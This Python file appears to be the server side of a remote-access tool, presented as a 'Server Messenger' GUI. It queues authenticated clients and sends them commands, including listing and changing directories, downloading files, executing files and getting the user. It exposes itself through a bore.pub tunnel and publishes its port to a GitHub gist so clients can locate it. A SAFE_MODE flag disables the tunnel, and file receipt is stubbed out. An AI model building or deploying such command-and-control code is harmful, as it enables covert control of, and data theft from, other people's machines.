import customtkinter as ctk
import socket
import threading
import subprocess
import re
import json
import time
import urllib.request
from dotenv import load_dotenv
import os

SAFE_MODE = True
HOST = "127.0.0.1"
PORT = 5050

load_dotenv()
KEY = os.getenv("KEY", "Nyx")

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(10)

receiving_file = False
current_filename = ""
remaining_bytes = 0
file_buffer = b""

clients = {}
client_queue = []
active_client = None

root = None
chat_textbox = None
commands_textbox = None
status_label = None
entry = None
queue_frame = None
remote_panel = None
overlay = None
tunnel_label = None
bore_process = None


def _strip_ansi(line):
    return re.sub(r"\x1b\[[0-9;]*m", "", line)

def _read_bore_stream(stream, port_found, timer):
    try:
        for line in iter(stream.readline, ""):
            if not line or port_found[0] is not None:
                break
            clean = _strip_ansi(line)
            m = re.search(r"bore\.pub[:\s]+(\d+)|remote_port[=:](\d+)|listening\s+at\s+.*?(\d{4,5})\b", clean)
            if m:
                port_found[0] = (m.group(1) or m.group(2) or m.group(3))
                timer.cancel()
                root.after(0, lambda p=port_found[0]: _show_bore_port(p))
                break
    except Exception:
        pass

def _read_bore_port():
    port_found = [None]

    def on_timeout():
        if port_found[0] is None:
            root.after(
                0,
                lambda: _set_tunnel_text("Bore port not detected — run 'bore local 5050 --to bore.pub' in a terminal"),
            )

    timer = threading.Timer(20.0, on_timeout)
    timer.daemon = True
    timer.start()
    t1 = threading.Thread(target=_read_bore_stream, args=(bore_process.stderr, port_found, timer), daemon=True)
    t2 = threading.Thread(target=_read_bore_stream, args=(bore_process.stdout, port_found, timer), daemon=True)
    t1.start()
    t2.start()

def start_bore():
    global bore_process
    if SAFE_MODE:
        root.after(0, lambda: _set_tunnel_text("Safe mode — tunnel disabled"))
        return
    try:
        bore_process = subprocess.Popen(
            ["bore", "local", "5050", "--to", "bore.pub"],
            stderr=subprocess.PIPE,
            stdout=subprocess.PIPE,
            text=True,
            bufsize=1,
        )
        t = threading.Thread(target=_read_bore_port, daemon=True)
        t.start()
    except FileNotFoundError:
        root.after(
            0,
            lambda: _set_tunnel_text("Bore not installed — run 'bore local 5050 --to bore.pub' yourself"),
        )
    except Exception as e:
        root.after(0, lambda: _set_tunnel_text(f"Bore error: {e}"))


def _update_gist_port(port):
    token = os.getenv("GITHUB_TOKEN")
    gist_id = os.getenv("GIST_ID")
    user = os.getenv("GITHUB_USER")
    if not token or not gist_id:
        return None
    try:
        req = urllib.request.Request(
            f"https://api.github.com/gists/{gist_id}",
            data=json.dumps({"files": {"port.txt": {"content": str(port)}}}).encode(),
            method="PATCH",
            headers={
                "Authorization": f"token {token}",
                "Content-Type": "application/json",
            },
        )
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read().decode())
            username = data.get("owner", {}).get("login") or user
    except Exception:
        username = user
    if username:
        return f"https://gist.githubusercontent.com/{username}/{gist_id}/raw/port.txt"
    return None


def _show_bore_port(port):
    _set_tunnel_text(f"bore.pub:{port}  →  set TUNNEL_PORT = {port} in client.py")
    add_system(f"[SYSTEM] Tunnel: bore.pub:{port} — set TUNNEL_PORT = {port} in client.py")
    try:
        path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bore_port.txt")
        with open(path, "w") as f:
            f.write(port)
    except Exception:
        pass
    port_url = _update_gist_port(port)
    if port_url:
        _set_tunnel_text(f"bore.pub:{port}  —  client fetches port from URL (no edit needed)")
        add_system(f"[SYSTEM] Port published. Set in client: PORT_URL = \"{port_url}\" (once).")
        try:
            url_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "client_port_url.txt")
            with open(url_path, "w") as f:
                f.write(port_url)
        except Exception:
            pass


def _set_tunnel_text(text):
    if tunnel_label:
        tunnel_label.configure(text=text)


def accept_connections():
    set_status("Waiting for clients...", "orange")
    while True:
        try:
            sock, addr = server.accept()
            buf = b""
            while b"\n" not in buf and len(buf) < 512:
                chunk = sock.recv(256)
                if not chunk:
                    sock.close()
                    break
                buf += chunk
            if not buf or b"\n" not in buf:
                try:
                    sock.close()
                except Exception:
                    pass
                continue
            line, rest = buf.split(b"\n", 1)
            auth_line = line.decode("utf-8", errors="ignore").strip()
            if not auth_line.startswith("AUTH ") or auth_line[5:].strip() != KEY:
                add_system(f"[SYSTEM] Rejected client (bad key): {addr[0]}:{addr[1]}")
                try:
                    sock.close()
                except Exception:
                    pass
                continue
            clients[sock] = {"addr": addr}
            client_queue.append(sock)
            add_system(f"[SYSTEM] Client joined queue: {addr[0]}:{addr[1]}")
            refresh_queue_ui()
            if len(client_queue) == 1:
                set_active_client(sock)
            threading.Thread(target=handle_client, args=(sock, rest if rest else None), daemon=True).start()
        except OSError:
            if server.fileno() == -1:
                break
            raise
        except Exception:
            set_status("Connection error (server still running)", "orange")


def handle_client(sock, first_data=None):
    try:
        if first_data:
            process_incoming(sock, first_data)
        while True:
            data = sock.recv(4096)
            if not data:
                break
            process_incoming(sock, data)
    except Exception:
        pass
    remove_client(sock)


def process_incoming(sock, data):
    global receiving_file, current_filename, file_buffer, remaining_bytes
    if sock != active_client:
        add_system(f"[QUEUE] Message from {clients[sock]['addr'][0]}:{clients[sock]['addr'][1]} (not active)")
        return
    if receiving_file:
        chunk = data
        if len(chunk) > remaining_bytes:
            file_part = chunk[:remaining_bytes]
            leftover = chunk[remaining_bytes:]
        else:
            file_part = chunk
            leftover = b""
        file_buffer += file_part
        remaining_bytes -= len(file_part)
        if remaining_bytes == 0:
            add_system("[SYSTEM] File receive removed for safety.")
            receiving_file = False
            current_filename = ""
            file_buffer = b""
            if leftover:
                data = leftover
            else:
                return
        else:
            return
    msg = data.decode("utf-8", errors="ignore")
    if msg.startswith("FILE "):
        parts = msg.strip().split(" ", 2)
        if len(parts) == 3 and parts[2].isdigit():
            current_filename = parts[1]
            remaining_bytes = int(parts[2])
            receiving_file = True
            file_buffer = b""
            add_system(f"[SYSTEM] Receiving file: {current_filename}")
            return
    if msg.startswith("DIR "):
        update_remote_dir(msg[4:])
        return
    add_client(msg)


def remove_client(sock):
    global active_client
    addr = clients.get(sock, {}).get("addr", ("?", "?"))
    if sock in client_queue:
        client_queue.remove(sock)
    if sock in clients:
        del clients[sock]
    try:
        sock.close()
    except:
        pass
    add_system(f"[SYSTEM] Client disconnected: {addr[0]}:{addr[1]}")
    if active_client == sock:
        active_client = None
        if client_queue:
            set_active_client(client_queue[0])
        else:
            set_status("Waiting for clients...", "red")
    refresh_queue_ui()


def set_active_client(sock):
    global active_client
    active_client = sock
    addr = clients[sock]["addr"]
    set_status(f"Active: {addr[0]}:{addr[1]}", "green")
    add_system(f"[SYSTEM] Active client: {addr[0]}:{addr[1]}")
    refresh_queue_ui()


def promote_client(sock):
    if sock in client_queue:
        client_queue.remove(sock)
        client_queue.insert(0, sock)
        set_active_client(sock)


def next_client():
    global active_client
    if not client_queue:
        active_client = None
        set_status("Waiting for clients...", "red")
        refresh_queue_ui()
        return
    client_queue.append(client_queue.pop(0))
    set_active_client(client_queue[0])


def push_active_to_back():
    if active_client in client_queue and len(client_queue) > 1:
        client_queue.append(client_queue.pop(0))
        set_active_client(client_queue[0])


def send_message(event=None):
    msg = entry.get().strip()
    entry.delete(0, ctk.END)
    if not msg:
        return
    if msg.lower() == "help":
        show_help()
        return
    if msg.lower() == "clear":
        chat_textbox.configure(state="normal")
        chat_textbox.delete("1.0", "end")
        chat_textbox.configure(state="disabled")
        return
    if msg.lower() == "shutdown":
        add_system("[SYSTEM] Shutting down server...")
        try:
            for s in list(clients.keys()):
                try:
                    s.close()
                except:
                    pass
        except:
            pass
        try:
            server.close()
        except:
            pass
        if bore_process and bore_process.poll() is None:
            try:
                bore_process.terminate()
            except Exception:
                pass
        root.destroy()
        return
    if not active_client:
        add_system("[SYSTEM] No active client.")
        return
    try:
        active_client.send(msg.encode("utf-8"))
        add_you(msg)
        push_active_to_back()
    except:
        add_system("[SYSTEM] Failed to send message.")


def add_system(text):
    chat_textbox.configure(state="normal")
    chat_textbox.insert("end", text + "\n", "system")
    chat_textbox.see("end")
    chat_textbox.configure(state="disabled")


def add_bubble(sender, text, tag):
    chat_textbox.configure(state="normal")
    chat_textbox.insert("end", f"{sender}:\n", tag)
    chat_textbox.insert("end", f"  {text}\n\n")
    chat_textbox.see("end")
    chat_textbox.configure(state="disabled")


def add_you(text):
    add_bubble("You", text, "you")


def add_client(text):
    add_bubble("Client", text, "client")


def set_status(text, color="white"):
    status_label.configure(text=text, text_color=color)


def show_help():
    help_text = (
        "help       → Show this help message\n"
        "clear      → Clear chat window\n"
        "shutdown   → Close server & exit\n"
        "ls         → list files\n"
        "cd         → change directory\n"
        "download   → download file\n"
        "exec       → execute file\n"
        "platform   → current platform\n"
        "getuser    → user\n"
        "test       → test if connected\n"
    )
    commands_textbox.configure(state="normal")
    commands_textbox.delete("1.0", "end")
    commands_textbox.insert("1.0", help_text)
    commands_textbox.configure(state="disabled")
    add_system("[SYSTEM] Help updated in left panel.")


def refresh_queue_ui():
    for w in queue_frame.winfo_children():
        w.destroy()
    for sock in client_queue:
        addr = clients[sock]["addr"]
        row = ctk.CTkFrame(queue_frame)
        row.pack(fill="x", pady=2)

        label = ctk.CTkLabel(row, text=f"{addr[0]}:{addr[1]}", anchor="w")
        label.pack(fill="x", padx=2, pady=1)

        btn_frame = ctk.CTkFrame(row)
        btn_frame.pack(fill="x", padx=2, pady=1)

        activate_btn = ctk.CTkButton(btn_frame, text="Activate", command=lambda s=sock: set_active_client(s))
        activate_btn.pack(side="left", expand=True, fill="x", padx=(0, 2))

        promote_btn = ctk.CTkButton(btn_frame, text="Promote", command=lambda s=sock: promote_client(s))
        promote_btn.pack(side="left", expand=True, fill="x", padx=(2, 2))

        disconnect_btn = ctk.CTkButton(btn_frame, text="Disconnect", fg_color="#b91c1c", hover_color="#7f1d1d", command=lambda s=sock: disconnect_client(s))
        disconnect_btn.pack(side="left", expand=True, fill="x", padx=(2, 0))

        if sock == active_client:
            label.configure(text_color="#22c55e")

def disconnect_client(sock):
    global active_client
    try:
        sock.close()
    except:
        pass
    if sock in client_queue:
        client_queue.remove(sock)
    if sock in clients:
        del clients[sock]
    if active_client == sock:
        active_client = None
        if client_queue:
            set_active_client(client_queue[0])
        else:
            set_status("Waiting for clients...", "red")
    refresh_queue_ui()
    add_system("[SYSTEM] Client disconnected manually.")

def update_remote_dir(text):
    lines = text.splitlines()
    formatted = []
    for line in lines:
        stripped = line.strip()
        if not stripped:
            continue

        lower = stripped.lower()

        if "<dir>" in lower:
            name = stripped.split()[-1]
            formatted.append(f"📁 {name}")
            continue

        parts = stripped.split()
        if len(parts) >= 4 and parts[0].count("/") == 2:
            name = parts[-1]
            if "." in name:
                formatted.append(f"📄 {name}")
            else:
                formatted.append(f"📁 {name}")
            continue

        if "." in stripped:
            formatted.append(f"📄 {stripped}")
        else:
            formatted.append(f"📁 {stripped}")

    output = "\n".join(formatted)
    remote_panel.configure(state="normal")
    remote_panel.delete("1.0", "end")
    remote_panel.insert("1.0", output)
    remote_panel.configure(state="disabled")

def show_modal():
    overlay.lift()
    modal = ctk.CTkFrame(overlay, width=320, height=180, corner_radius=10, fg_color="#1a1a1a")
    modal.place(relx=0.5, rely=0.5, anchor="center")
    title = ctk.CTkLabel(modal, text="Client Queue", font=("Segoe UI", 16, "bold"))
    title.pack(pady=(15, 10))
    btn_row = ctk.CTkFrame(modal)
    btn_row.pack(pady=10, padx=15, fill="x")
    next_btn = ctk.CTkButton(btn_row, text="Next Client", command=lambda: (next_client(), hide_modal()))
    next_btn.pack(side="left", expand=True, fill="x", padx=(0, 5))
    close_btn = ctk.CTkButton(btn_row, text="Close", command=hide_modal)
    close_btn.pack(side="right", expand=True, fill="x", padx=(5, 0))


def hide_modal():
    for w in overlay.winfo_children():
        w.destroy()
    overlay.lower()


ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

root = ctk.CTk()
root.title("Server Messenger")
root.geometry("1400x850")
root.resizable(False, False)

FONT = ("Segoe UI", 14)

main_frame = ctk.CTkFrame(root)
main_frame.pack(fill="both", expand=True, padx=10, pady=10)

left_frame = ctk.CTkFrame(main_frame, width=350)
left_frame.pack(side="left", fill="y", padx=(0, 10))

right_frame = ctk.CTkFrame(main_frame)
right_frame.pack(side="right", fill="both", expand=True)

status_label = ctk.CTkLabel(left_frame, text="Waiting for clients...", font=("Segoe UI", 14, "bold"))
status_label.pack(pady=(10, 5), padx=10, anchor="w")

tunnel_label = ctk.CTkLabel(left_frame, text="Starting bore tunnel...", font=("Segoe UI", 11), text_color="#9ca3af", wraplength=320)
tunnel_label.pack(pady=(0, 5), padx=10, anchor="w")

ctk.CTkLabel(left_frame, text="Commands", font=("Segoe UI", 13, "bold")).pack(pady=(10, 5), padx=10, anchor="w")
commands_textbox = ctk.CTkTextbox(left_frame, width=230, height=120, font=("Consolas", 12))
commands_textbox.pack(padx=10, pady=(0, 10), fill="x")
commands_textbox.insert("1.0", "Type 'help' to list commands here.")
commands_textbox.configure(state="disabled")

ctk.CTkLabel(left_frame, text="Remote Directory", font=("Segoe UI", 13, "bold")).pack(pady=(0, 5), padx=10, anchor="w")
remote_panel = ctk.CTkTextbox(left_frame, width=230, height=140, font=("Consolas", 11))
remote_panel.pack(padx=10, pady=(0, 10), fill="x")
remote_panel.insert("1.0", "Waiting for DIR data...")
remote_panel.configure(state="disabled")

ctk.CTkLabel(left_frame, text="Client Queue", font=("Segoe UI", 13, "bold")).pack(pady=(0, 5), padx=10, anchor="w")
queue_frame = ctk.CTkFrame(left_frame)
queue_frame.pack(padx=10, pady=(0, 10), fill="both", expand=True)

manage_btn = ctk.CTkButton(left_frame, text="Manage Queue", command=show_modal)
manage_btn.pack(padx=10, pady=(0, 10), fill="x")

chat_textbox = ctk.CTkTextbox(right_frame, font=FONT)
chat_textbox.pack(fill="both", expand=True, padx=10, pady=(10, 5))
chat_textbox.insert("1.0", "[SYSTEM] Waiting for clients...\n")
chat_textbox.configure(state="disabled")
chat_textbox.tag_config("system", foreground="#9ca3af")
chat_textbox.tag_config("you", foreground="#60a5fa")
chat_textbox.tag_config("client", foreground="#f97373")

bottom_frame = ctk.CTkFrame(root)
bottom_frame.pack(fill="x", padx=10, pady=(0, 10))

entry = ctk.CTkEntry(bottom_frame, height=40, font=FONT)
entry.pack(side="left", fill="x", expand=True, padx=(0, 10), pady=5)

send_btn = ctk.CTkButton(bottom_frame, text="Send", width=100, height=40, command=send_message)
send_btn.pack(side="right", pady=5)

entry.bind("<Return>", send_message)

overlay = ctk.CTkFrame(root, fg_color="#111111")
overlay.place(relx=0, rely=0, relwidth=1, relheight=1)
overlay.lower()

threading.Thread(target=accept_connections, daemon=True).start()
threading.Thread(target=start_bore, daemon=True).start()

root.mainloop()
